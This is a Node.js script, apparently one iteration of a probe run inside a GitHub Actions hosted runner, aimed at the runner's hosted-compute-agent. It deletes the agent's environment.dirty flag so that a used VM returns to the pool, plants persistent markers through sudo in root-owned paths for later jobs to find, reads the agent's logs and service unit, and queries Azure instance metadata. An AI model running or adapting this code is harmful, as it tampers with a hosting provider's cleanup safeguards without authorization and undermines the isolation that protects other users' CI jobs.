const fs = require('fs');
const { execSync } = require('child_process');
const os = require('os');

// v33: VM reuse proof — write marker to /home/runner/ and /opt/hca/ (outside /tmp which is cleaned)
// HYPOTHESIS: v31 deleted environment.dirty → HCA returned VM to pool → v32 reused same VM
// EVIDENCE: both v31 and v32 had hostname=runnervm7b5n9 (same!)
// BUT /tmp/ is cleaned between jobs → marker not found in /tmp/ in v32
// FIX: write marker to /home/runner/vm_reuse_marker (outside workspace, not cleaned between jobs)

function run(cmd, timeoutMs) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: timeoutMs || 20000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 400).trim(); }
}

async function main() {
  console.log('=== V33: VM reuse proof via persistent marker (outside /tmp/) ===');
  const hostname = os.hostname();
  const ts = Date.now();
  const run_id = process.env.GITHUB_RUN_ID || 'unknown';

  console.log('[V33] hostname:', hostname);
  console.log('[V33] run_id:', run_id);

  // === PART 1: Check for existing markers from v31/v32 in persistent locations ===
  console.log('\n=== PART 1: Persistent marker check (outside /tmp/) ===');

  const persistentPaths = [
    '/home/runner/vm_reuse_marker',
    '/opt/hca/vm_reuse_marker',
    '/home/runner/.vm_marker',
    '/opt/hca/.vm_marker',
  ];

  let reuseConfirmed = false;
  for (const p of persistentPaths) {
    const exists = fs.existsSync(p);
    console.log('[MARKER] ' + p + ' exists:', exists);
    if (exists) {
      const content = fs.readFileSync(p, 'utf8');
      console.log('[MARKER] *** PERSISTENT MARKER FOUND — VM REUSE CONFIRMED! ***');
      console.log('[MARKER] Previous marker content:', content);
      console.log('[MARKER] Current hostname:', hostname);
      reuseConfirmed = true;
    }
  }

  // Also check /tmp/ for completeness (probably cleaned)
  const tmpMarker = '/tmp/hca_vm_reuse_marker_v31';
  console.log('[MARKER] /tmp/hca_vm_reuse_marker_v31 exists:', fs.existsSync(tmpMarker));

  // Check entire /home/runner/ for any leftover files from previous runs
  console.log('[MARKER] /home/runner/ listing:');
  console.log(run('ls -la /home/runner/ 2>/dev/null | head -20'));

  // Check /opt/hca/ for any leftover files from previous runs
  console.log('[MARKER] /opt/hca/ listing:');
  console.log(run('ls -la /opt/hca/ 2>/dev/null'));

  // Check /home/runner/actions-runner/ for leftover state
  console.log('[MARKER] /home/runner/actions-runner/ listing:');
  console.log(run('ls -la /home/runner/actions-runner/ 2>/dev/null | head -10'));

  // === PART 2: Write NEW persistent markers in durable locations for v34 to detect ===
  console.log('\n=== PART 2: Write persistent markers for v34 ===');

  const markerContent = [
    'hostname=' + hostname,
    'run_id=' + run_id,
    'timestamp=' + ts,
    'hca_binary_md5=' + run('md5sum /opt/hca/hosted-compute-agent 2>/dev/null').split(' ')[0],
    'env_dirty_exists=' + fs.existsSync('/opt/hca/environment.dirty'),
    'ip=' + run('hostname -I 2>/dev/null').trim(),
    'boot_id=' + run('cat /proc/sys/kernel/random/boot_id 2>/dev/null'),
  ].join('\n') + '\n';

  console.log('[MARKER] Writing marker content:', markerContent.trim());

  // Write to all durable paths
  for (const p of persistentPaths) {
    try {
      fs.writeFileSync(p, markerContent);
      console.log('[MARKER] Written to', p, '→ OK');
    } catch(e) {
      // Try with sudo for root-owned paths
      run('sudo sh -c \'echo "' + markerContent.replace(/'/g, "'\\''") + '" > ' + p + '\'');
      const existsNow = fs.existsSync(p);
      console.log('[MARKER] Written to', p, 'via sudo →', existsNow ? 'OK' : 'FAILED');
    }
  }

  // Also write to /var/log/ (may persist if same VM)
  try {
    fs.writeFileSync('/var/log/vm_reuse_marker', markerContent);
    console.log('[MARKER] Written to /var/log/vm_reuse_marker → OK');
  } catch(e) {
    run('sudo sh -c \'printf "%s" "' + hostname + ' ' + ts + ' ' + run_id + '" > /var/log/vm_reuse_marker\'');
    console.log('[MARKER] /var/log/vm_reuse_marker via sudo:', fs.existsSync('/var/log/vm_reuse_marker') ? 'OK' : 'FAILED');
  }

  // === PART 3: Boot ID — definitive VM identity proof ===
  console.log('\n=== PART 3: VM identity — boot_id is unique per VM boot ===');
  const bootId = run('cat /proc/sys/kernel/random/boot_id 2>/dev/null');
  console.log('[BOOT_ID] boot_id:', bootId);
  // If v34 sees the same boot_id, it's the SAME physical boot (irrefutable same-VM proof)
  console.log('[BOOT_ID] Writing boot_id to /home/runner/.boot_id for v34 detection');
  try { fs.writeFileSync('/home/runner/.boot_id', bootId + '\n' + hostname + '\n' + run_id + '\n' + ts + '\n'); } catch(e) {}
  try { fs.writeFileSync('/opt/hca/.boot_id', bootId + '\n' + hostname + '\n' + run_id + '\n' + ts + '\n'); } catch(e) {}

  // === PART 4: environment.dirty deletion again ===
  console.log('\n=== PART 4: Delete environment.dirty ===');
  const dirtyExists = fs.existsSync('/opt/hca/environment.dirty');
  console.log('[DIRTY] environment.dirty exists:', dirtyExists);
  if (dirtyExists) {
    const del = run('rm /opt/hca/environment.dirty && echo ok || echo fail');
    console.log('[DIRTY] Deleted:', del);
  }

  // === PART 5: Check HCA log for reuse-related messages ===
  console.log('\n=== PART 5: HCA log — check for reuse-related entries ===');
  const hcaLog = run('sudo cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null');
  console.log('[HCA_LOG] Total size:', hcaLog.length, 'bytes');

  // Look for reuse-related keywords
  const reuseLines = hcaLog.split('\n').filter(l =>
    /reuse|dirty|doNotReuse|clean|markReused|reuseFrame/i.test(l)
  );
  console.log('[HCA_LOG] Reuse-related lines:', reuseLines.length);
  reuseLines.slice(0, 20).forEach(l => console.log('[HCA_LOG]', l));

  // Also log the last 10 lines
  const lastLines = hcaLog.split('\n').slice(-10);
  console.log('[HCA_LOG] Last 10 lines:');
  lastLines.forEach(l => console.log('[HCA_LOG]', l));

  // === PART 6: systemd unit file ===
  console.log('\n=== PART 6: hosted-compute-agent.service unit file ===');
  const unitFile = run('sudo systemctl cat hosted-compute-agent.service 2>/dev/null || sudo cat /etc/systemd/system/hosted-compute-agent.service 2>/dev/null');
  console.log('[SYSTEMD]', unitFile.substring(0, 2000));

  // === PART 7: VM metadata — check if running instance ID matches v31/v32 ===
  console.log('\n=== PART 7: Azure IMDS — instance ID ===');
  const imds = run('curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null');
  if (imds && !imds.startsWith('ERR') && !imds.includes('blocked')) {
    try {
      const meta = JSON.parse(imds);
      const compute = meta.compute || {};
      console.log('[IMDS] vmId:', compute.vmId);
      console.log('[IMDS] name:', compute.name);
      console.log('[IMDS] vmSize:', compute.vmSize);
      console.log('[IMDS] zone:', compute.zone);
      console.log('[IMDS] platformFaultDomain:', compute.platformFaultDomain);
      console.log('[IMDS] placementGroupId:', compute.placementGroupId);
      // Write vmId to persistent storage for cross-run comparison
      if (compute.vmId) {
        try { fs.appendFileSync('/home/runner/.boot_id', 'vmId=' + compute.vmId + '\n'); } catch(e) {}
        console.log('[IMDS] vmId written to /home/runner/.boot_id for v34 comparison');
      }
    } catch(e) {
      console.log('[IMDS] raw:', imds.substring(0, 500));
    }
  } else {
    console.log('[IMDS] blocked/unavailable');
  }

  console.log('\n=== V33 Complete. Deploy v34 to check for persistent markers. ===');
  console.log('[SUMMARY] reuseConfirmed:', reuseConfirmed);
  console.log('[SUMMARY] hostname:', hostname);
  console.log('[SUMMARY] boot_id:', bootId);
}

main().catch(e => console.log('Fatal:', e.message, e.stack));
